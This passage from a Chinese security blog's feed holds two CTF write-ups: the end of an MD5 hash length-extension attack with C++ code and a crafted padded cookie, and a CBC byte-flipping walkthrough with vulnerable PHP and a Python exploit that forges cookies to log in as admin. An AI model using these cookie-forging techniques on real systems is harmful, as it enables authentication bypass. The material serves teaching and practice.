 for(int i &#x3D; 0;i &lt; 4;i ++)&#123;</span><br><span class="line">        state[i] &#x3D; s_state[i];&#x2F;&#x2F;将最开始的默认静态渐变变量赋值给静态渐变变量</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline uint MD5::F(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return (X &amp; Y) | ((~X) &amp; Z);</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::G(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return (X &amp; Z) | (Y &amp; (~Z));</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::H(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return X ^ Y ^ Z;</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::I(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return Y ^ (X | (~Z));</span><br><span class="line">&#125;</span><br><span class="line">uint MD5::ROL(uint s, uint ws) &#123;</span><br><span class="line">    return (s &lt;&lt; ws) | (s &gt;&gt; (32 - ws));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">inline void MD5::FF(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a &#x3D; ROL(a + F(b, c, d) + x + ac, s) + b;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;ff\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::GG(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a &#x3D; ROL(a + G(b, c, d) + x + ac, s) + b;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;gg\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::HH(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a &#x3D; ROL(a + H(b, c, d) + x + ac, s) + b;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;hh\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::II(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a &#x3D; ROL(a + I(b, c, d) + x + ac, s) + b;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;ii\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;这里前面讲了</span><br><span class="line">inline uint MD5::T(uint i) &#123;</span><br><span class="line">    return (uint)((0xffffffff + 1LL) * abs(sin(i)));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;取64个字节放在Memory数组中</span><br><span class="line">void MD5::data_Init() &#123;</span><br><span class="line">    uint tmp &#x3D; 0;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 64; i ++) &#123;</span><br><span class="line">        Memory[i] &#x3D; init_arr[curM + i];</span><br><span class="line">    &#125;</span><br><span class="line">    curM +&#x3D; 64;&#x2F;&#x2F;变化位置</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">void MD5::create_T_arr() &#123;</span><br><span class="line">    for(int i &#x3D; 1; i &lt;&#x3D; 64; i ++) &#123;</span><br><span class="line">        Tarr[i - 1] &#x3D; T(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;*</span><br><span class="line">这里使用了小端将数据存在M数组中，可以稍微思考一下</span><br><span class="line">*&#x2F;</span><br><span class="line">void MD5::create_M_arr() &#123;</span><br><span class="line">    uint tmp &#x3D; 0;</span><br><span class="line">    int cnt &#x3D; 0;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 64; i +&#x3D; 4) &#123;</span><br><span class="line">        tmp &#x3D; 0;</span><br><span class="line">        for(int j &#x3D; 3; j &gt;&#x3D; 0; j --) &#123;</span><br><span class="line">            tmp |&#x3D; Memory[i + j];</span><br><span class="line">            if(j &#x3D;&#x3D; 0) break;</span><br><span class="line">            tmp &lt;&lt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        M[cnt ++] &#x3D; tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;移动a,b,c,d，最后一个移到第一个</span><br><span class="line">void MD5::l_data_change(uint *buf) &#123;</span><br><span class="line">    uint buftmp[4] &#x3D; &#123;buf[3], buf[0], buf[1], buf[2]&#125;;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        buf[i] &#x3D; buftmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void MD5::processing() &#123;</span><br><span class="line">    uint statetmp[4];</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        statetmp[i] &#x3D; state[i];</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;*</span><br><span class="line">        这里的处理只是为了更方便的循环</span><br><span class="line">    *&#x2F;</span><br><span class="line">    uint * a &#x3D; &amp;statetmp[0];</span><br><span class="line">    uint * b &#x3D; &amp;statetmp[1];</span><br><span class="line">    uint * c &#x3D; &amp;statetmp[2];</span><br><span class="line">    uint * d &#x3D; &amp;statetmp[3];</span><br><span class="line"> </span><br><span class="line">    &#x2F;*</span><br><span class="line">        产生M数组和T数组</span><br><span class="line">    *&#x2F;</span><br><span class="line">    create_M_arr();</span><br><span class="line">    create_T_arr();</span><br><span class="line"> </span><br><span class="line">    &#x2F;*</span><br><span class="line">        建立函数指针数组</span><br><span class="line">        循环处理</span><br><span class="line">    *&#x2F;</span><br><span class="line"> </span><br><span class="line">    deal_fun d_fun[4] &#x3D; &#123;</span><br><span class="line">        &amp;MD5::FF, &amp;MD5::GG, &amp;MD5::HH, &amp;MD5::II</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    for(int i &#x3D; 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        for(int j &#x3D; 0; j &lt; 16; j ++) &#123;</span><br><span class="line">            (this -&gt;* d_fun[i])(*a, *b, *c, *d, M[mN[i][j]], rolarray[i][j % 4], Tarr[i * 16 + j]);</span><br><span class="line">            l_data_change(statetmp);&#x2F;&#x2F;交换a,b,c,d</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    for(int i &#x3D; 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        state[i] +&#x3D; statetmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">string MD5::get_MD5() &#123;</span><br><span class="line">    string result;</span><br><span class="line">    char tmp[15];</span><br><span class="line">    for(int i &#x3D; 0;i &lt; (lenZ - (offset - 1) * 64) &#x2F; 64;i ++)&#123;</span><br><span class="line">        data_Init();</span><br><span class="line">        processing();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;*</span><br><span class="line">        最终显示也是用小端</span><br><span class="line">    *&#x2F;</span><br><span class="line"> </span><br><span class="line">    for(int i &#x3D; 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &amp; 0xff);</span><br><span class="line">        result +&#x3D; tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 8 &amp; 0xff);</span><br><span class="line">        result +&#x3D; tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 16 &amp; 0xff);</span><br><span class="line">        result +&#x3D; tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 24 &amp; 0xff);</span><br><span class="line">        result +&#x3D; tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">    MD5 md1(&quot;123456789123456adminadmin123456789123456789123456789123456789123admin&quot;,2);</span><br><span class="line">    cout &lt;&lt; md1.get_MD5() &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将运行代码得到的hash值利用getmein写入cookie，将username=admin，passsword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1ftj00nu1bxj30xp097ach.jpg" alt="image"><br>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>参考文章：<br><a href="https://www.cnblogs.com/p00mj/p/6288337.html">MD5的Hash长度扩展攻击</a><br><a href="http://www.freebuf.com/articles/web/31756.html">科普哈希长度扩展攻击</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;hash长度扩展攻击&quot;&gt;&lt;a href=&quot;#hash长度扩展攻击&quot; class=&quot;headerlink&quot; title=&quot;hash长度扩展攻击&quot;&gt;&lt;/a&gt;hash长度扩展攻击&lt;/h3&gt;&lt;h4 id=&quot;MD5加密算法&quot;&gt;&lt;a href=&quot;#MD5加密算法&quot; class
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
      <category term="密码学" scheme="http://yoursite.com/child/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://yoursite.com/child/2018/06/22/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/child/2018/06/22/CBC字节翻转攻击/</id>
    <published>2018-06-22T03:35:12.000Z</published>
    <updated>2018-06-27T09:27:04.438Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>CBC加密是AES加密的一种模式，中文名叫密码分组链接模式（Cipher Block Chaining (CBC)），这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。<br>看下图：<br>IV：随机生成的初始向量<br>Plaintxt：明文数据<br>Ciphertext：密文数据<br>Key：分组加密使用的密钥   </p><h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><p><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip1.png" alt="image">   </p><p>首先将我们需要将需要加密的明文按照十六个字节为一组分组，最后一组不满十六字节用特殊字符填补<br>接着系统产生一个十六字节的随机字符串作为初始向量，该向量与第一组明文进行异或操作，再与key进行CBC加密得到第一组密文<br>第一组密文再与下一组明文进行异或操作CBC加密得到第二组密文<br>以此类推……<br>将得到的密文组按顺序拼接到一起就是所得到的密文  </p><h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><p><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip2.png" alt="image"><br>首先将密文按十六进制分组<br>第一组密文与key进行CBC解密，再将解密的数据与初始向量异或得到第一组明文<br>接着第一组密文再与下一组CBC解密得到的数据进行异或操作得到第二组明文<br>以此类推……<br>最后拼接得到明文   </p><h5 id="异或操作"><a href="#异或操作" class="headerlink" title="异或操作"></a>异或操作</h5><p>CBC字节翻转的关键点就在异或上，所以首先我们要明白异或是什么。<br><img src="https://screenshotscdn.firefoxusercontent.com/images/e68ed912-038b-43ad-8c51-7dde8359fe7d.png" alt="image"><br>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。  </p><h5 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h5><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fspt6lq2ufj30w90awdh5.jpg" alt="image"><br>攻击针对的是解密过程<br>第一步：修改  </p><p>由图可知，你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。   </p><p>所以我们要找到要修改的明文中的那一个字节C，我，上一组密文对应字节为A，本组密文对应字节为B，我们知道了A xor B = C，我们现在现在要将C改变为c，那么知道A XOR B XOR C = 0，则A XOR B XOR C xor c= c。  </p><p>这里我们知道B是解密后的数据未知我们不好修改，所以我们可以将A修改a=A xor C xor c ，这样我们就将C替换成了c。  </p><p>第二步：修复  </p><p>上一步我们将第二组明文修改为了我们想要得到的数据，但是，与此同时，我们也将第一组密文给修改了，这就会导致第一组明文数据被修改，那么我们不能去修改第一组密文，又要使第一组明文数据正确，我们只有利用异或对初始向量下手。  </p><p>若原iv为O，新iv为N，错误的第一组明文M = O xor 第一组密文，我们要想得到正确的第一组明文m，那么就去改变N = O xor M xor m，这样就利用异或得到了正确的明文。  </p><h5 id="看个例子"><a href="#看个例子" class="headerlink" title="看个例子"></a>看个例子</h5><p>这是iscc的一道题Only admin can see flag<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fspuq0rb5qj30ky0a83z2.jpg" alt="image"><br>查看源码发现一个TXT文件，打开得到PHP代码   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&#39;&#x2F;root&#x2F;key&#39;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"> &#x2F;&#x2F;设置随机初始向量</span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置cookie的流程调用的函数，返回一个随机的iv和使用该iv加密的post提交的username和password的结果——cipher</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv &#x3D; get_random_iv();</span><br><span class="line">    &#x2F;&#x2F;序列化传入数组</span><br><span class="line">    #a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;&#125;</span><br><span class="line">    #第一组明文：a:2:&#123;s:8:&quot;userna</span><br><span class="line">    #第二组明文：me&quot;;s:5:&quot;Admin&quot;;</span><br><span class="line">    #第三组明文：s:8:&quot;password&quot;;s</span><br><span class="line">    #第四组明文：:4:&quot;test&quot;;&#125;</span><br><span class="line">    $plain &#x3D; serialize($info);</span><br><span class="line">    &#x2F;&#x2F;cbc加密</span><br><span class="line">    $cipher &#x3D; openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&#39;username&#39;] &#x3D; $info[&#39;username&#39;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;检查函数，这里是对cookie中cipher和iv进行CBC翻转的利用点</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        &#x2F;&#x2F;进行CBC模式的AES解密</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            &#x2F;&#x2F;对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $info[&#39;username&#39;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> &#x2F;&#x2F;根据session中username参数，控制显示结果</span><br><span class="line">&#x2F;&#x2F;如果没有设置参数，进入判断cookie路径</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    &#x2F;&#x2F;session要为admin</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">        echo &#39;&lt;p&gt;Only admin can see flag&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;p&gt;&lt;a href&#x3D;&quot;loginout.php&quot;&gt;Log out&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"> &#x2F;&#x2F;入口</span><br><span class="line">if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123;</span><br><span class="line">    $username &#x3D; (string)$_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; (string)$_POST[&#39;password&#39;];</span><br><span class="line">    &#x2F;&#x2F;post传参不能为admin</span><br><span class="line">    if($username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info &#x3D; array(&#39;username&#39;&#x3D;&gt;$username,&#39;password&#39;&#x3D;&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;body class&#x3D;&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;user-icon&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;pass-icon&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;form name&#x3D;&quot;login-form&quot; class&#x3D;&quot;login-form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;&#x2F;h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;&#x2F;span&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;username&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input username&quot; value&#x3D;&quot;Username&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; class&#x3D;&quot;input password&quot; value&#x3D;&quot;Password&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot; class&#x3D;&quot;button&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;body&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我已经在其中做出详细的注释<br>首先从入口开始验证post是否传参username和password，这里要求传入的用户名不能为admin。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123;</span><br><span class="line">    $username &#x3D; (string)$_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; (string)$_POST[&#39;password&#39;];</span><br><span class="line">    &#x2F;&#x2F;post传参不能为admin</span><br><span class="line">    if($username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info &#x3D; array(&#39;username&#39;&#x3D;&gt;$username,&#39;password&#39;&#x3D;&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着对传入参数序列化，接着对起进行一次CBC加密，得到了COOKIE值iv和cipher，以及session值username，对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值，但是这里又要传入的username参数为admin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        &#x2F;&#x2F;进行CBC模式的AES解密</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            &#x2F;&#x2F;对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $info[&#39;username&#39;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们利用CBC翻转字节，传入Admin绕过过滤，再在加密过程中将A翻转为a，通过验证。<br>修改代码如下：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib,base64,requests,re</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;*.*.*.*&#x2F;index.php&quot;</span><br><span class="line">datas &#x3D; &#123;</span><br><span class="line">    &quot;username&quot; : &quot;Admin&quot;,</span><br><span class="line">    &quot;password&quot; : &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">#第一组明文：a:2:&#123;s:8:&quot;userna</span><br><span class="line">#第二组明文：me&quot;;s:5:&quot;admin&quot;;</span><br><span class="line">#第三组明文：s:8:&quot;password&quot;;s</span><br><span class="line">#第四组明文：:4:&quot;test&quot;;&#125;</span><br><span class="line">#修改过程</span><br><span class="line">r &#x3D; requests.post(url,data&#x3D;datas)</span><br><span class="line">cipher &#x3D; r.cookies.get(&quot;cipher&quot;)#获取初始密文</span><br><span class="line">cipher &#x3D; base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">offset &#x3D; 9</span><br><span class="line">new_cipher &#x3D; cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]#字节翻转</span><br><span class="line">new_cookies &#x3D; requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">new_cookies[&quot;cipher&quot;] &#x3D; urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">#修复过程</span><br><span class="line">r2 &#x3D; requests.get(url,cookies&#x3D;new_cookies)</span><br><span class="line">#获得损坏的第一段明文</span><br><span class="line">plain &#x3D; base64.b64decode(re.findall(&quot;decode(&#39;(.*)&#39;)&quot;,r2.text)[0])</span><br><span class="line">iv &#x3D; base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))</span><br><span class="line">old &#x3D; plain[:len(iv)]</span><br><span class="line">new &#x3D; &#39;a:2:&#123;s:8:&quot;userna&#39;</span><br><span class="line">new_iv &#x3D; &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])</span><br><span class="line">new_cookies[&quot;iv&quot;] &#x3D; urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 &#x3D; requests.get(url,cookies&#x3D;new_cookies)</span><br><span class="line">print(r3.text)</span><br></pre></td></tr></table></figure><p>最后将修改的iv和cipher设为cookies得到flag   </p><p>CBC翻转字节攻击属于密码学的题目，关键是理解加密解密过程和异或操作，后面还遇到了翻转攻击与SQL注入的结合题型，值得继续了解。。。  </p>]]></content>
    
    <summary type="html">
    
      
      
